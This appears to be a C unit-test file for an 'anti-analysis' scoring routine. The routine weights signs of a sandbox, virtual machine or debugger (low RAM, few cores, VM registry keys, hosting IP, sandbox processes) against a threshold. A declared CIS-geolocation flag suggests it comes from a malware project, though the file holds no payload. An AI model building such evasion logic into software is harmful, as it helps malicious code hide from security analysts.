/*
 * test_scoring.c — Anti-analysis scoring logic tests (no Win32 runtime needed)
 * Tests the scoring math and threshold logic from anti_analysis.c
 * Build: gcc -Wall -Wextra -O2 -Iinclude -std=c11 -o tests/test_scoring.exe tests/test_scoring.c
 */
#include <assert.h>
#include <stdio.h>
#include <string.h>

/* ── Simulate the scoring struct from anti_analysis.h ─────── */

typedef struct {
    unsigned int low_ram       : 1;
    unsigned int few_cores     : 1;
    unsigned int vm_registry   : 1;
    unsigned int timing_tsc    : 1;
    unsigned int debugger      : 1;
    unsigned int small_screen  : 1;
    unsigned int small_disk    : 1;
    unsigned int low_uptime    : 1;
    unsigned int static_mouse : 1;
    unsigned int geo_cis       : 1;
    unsigned int hosting_ip    : 1;
    unsigned int sandbox_proc  : 1;
    unsigned int process_list  : 1;
} analysis_flags;

typedef struct {
    int score;
    analysis_flags flags;
} analysis_result;

/* ── Simulate scoring ─────────────────────────────────────── */

static analysis_result compute_score(int ram_mb, int cores, int screen_w,
                                      int disk_gb, int uptime_min,
                                      int has_debugger, int has_vm_reg,
                                      int is_hosting, int has_sandbox_proc) {
    analysis_result r = {0};
    if (ram_mb < 4096) { r.score += 15; r.flags.low_ram = 1; }
    if (cores < 2) { r.score += 15; r.flags.few_cores = 1; }
    if (has_vm_reg) { r.score += 20; r.flags.vm_registry = 1; }
    if (has_debugger) { r.score += 25; r.flags.debugger = 1; }
    if (screen_w < 800) { r.score += 10; r.flags.small_screen = 1; }
    if (disk_gb < 60) { r.score += 10; r.flags.small_disk = 1; }
    if (uptime_min < 10) { r.score += 10; r.flags.low_uptime = 1; }
    if (is_hosting == 1) { r.score += 25; r.flags.hosting_ip = 1; }
    if (has_sandbox_proc) { r.score += 30; r.flags.sandbox_proc = 1; }
    return r;
}

#define THRESHOLD 90

/* ═══════════════════════ TESTS ═════════════════════════════ */

static void test_clean_system(void) {
    analysis_result r = compute_score(8192, 4, 1920, 500, 3600, 0, 0, 0, 0);
    assert(r.score == 0);
    assert(r.flags.low_ram == 0);
    printf("  PASS: test_clean_system\n");
}

static void test_low_ram(void) {
    analysis_result r = compute_score(2048, 4, 1920, 500, 3600, 0, 0, 0, 0);
    assert(r.score == 15);
    assert(r.flags.low_ram == 1);
    printf("  PASS: test_low_ram\n");
}

static void test_few_cores(void) {
    analysis_result r = compute_score(8192, 1, 1920, 500, 3600, 0, 0, 0, 0);
    assert(r.score == 15);
    assert(r.flags.few_cores == 1);
    printf("  PASS: test_few_cores\n");
}

static void test_vm_registry(void) {
    analysis_result r = compute_score(8192, 4, 1920, 500, 3600, 0, 1, 0, 0);
    assert(r.score == 20);
    assert(r.flags.vm_registry == 1);
    printf("  PASS: test_vm_registry\n");
}

static void test_debugger_detected(void) {
    analysis_result r = compute_score(8192, 4, 1920, 500, 3600, 1, 0, 0, 0);
    assert(r.score == 25);
    assert(r.flags.debugger == 1);
    printf("  PASS: test_debugger_detected\n");
}

static void test_hosting_ip(void) {
    analysis_result r = compute_score(8192, 4, 1920, 500, 3600, 0, 0, 1, 0);
    assert(r.score == 25);
    assert(r.flags.hosting_ip == 1);
    printf("  PASS: test_hosting_ip\n");
}

static void test_sandbox_processes(void) {
    analysis_result r = compute_score(8192, 4, 1920, 500, 3600, 0, 0, 0, 1);
    assert(r.score == 30);
    assert(r.flags.sandbox_proc == 1);
    printf("  PASS: test_sandbox_processes\n");
}

static void test_combined_indicators_below_threshold(void) {
    /* low_ram(15) + few_cores(15) + small_disk(10) = 40 < 90 */
    analysis_result r = compute_score(2048, 1, 1920, 30, 3600, 0, 0, 0, 0);
    assert(r.score == 40);
    assert(r.score < THRESHOLD);
    printf("  PASS: test_combined_below_threshold\n");
}

static void test_combined_indicators_above_threshold(void) {
    /* debugger(25) + hosting(25) + sandbox(30) + vm_registry(20) = 100 >= 90 */
    analysis_result r = compute_score(8192, 4, 1920, 500, 3600, 1, 1, 1, 1);
    assert(r.score == 100);
    assert(r.score >= THRESHOLD);
    printf("  PASS: test_combined_above_threshold\n");
}

static void test_exact_threshold(void) {
    /* debugger(25) + hosting(25) + sandbox(30) + small_screen(10) = 90 */
    analysis_result r = compute_score(8192, 4, 799, 500, 3600, 1, 0, 1, 1);
    assert(r.score == 90);
    assert(r.score >= THRESHOLD);
    printf("  PASS: test_exact_threshold\n");
}

static void test_just_below_threshold(void) {
    /* debugger(25) + hosting(25) + sandbox(30) = 80 < 90 */
    analysis_result r = compute_score(8192, 4, 1920, 500, 3600, 1, 0, 1, 1);
    assert(r.score == 80);
    assert(r.score < THRESHOLD);
    printf("  PASS: test_just_below_threshold\n");
}

static void test_max_score_all_flags(void) {
    analysis_result r = compute_score(1024, 1, 640, 10, 1, 1, 1, 1, 1);
    assert(r.score == 15+15+20+25+10+10+10+25+30);
    assert(r.flags.low_ram && r.flags.few_cores && r.flags.vm_registry);
    assert(r.flags.debugger && r.flags.hosting_ip && r.flags.sandbox_proc);
    printf("  PASS: test_max_score_all_flags\n");
}

int main(void) {
    printf("=== test_scoring: anti-analysis scoring logic ===\n");
    test_clean_system();
    test_low_ram();
    test_few_cores();
    test_vm_registry();
    test_debugger_detected();
    test_hosting_ip();
    test_sandbox_processes();
    test_combined_indicators_below_threshold();
    test_combined_indicators_above_threshold();
    test_exact_threshold();
    test_just_below_threshold();
    test_max_score_all_flags();
    printf("=== test_scoring: ALL PASSED ===\n");
    return 0;
}
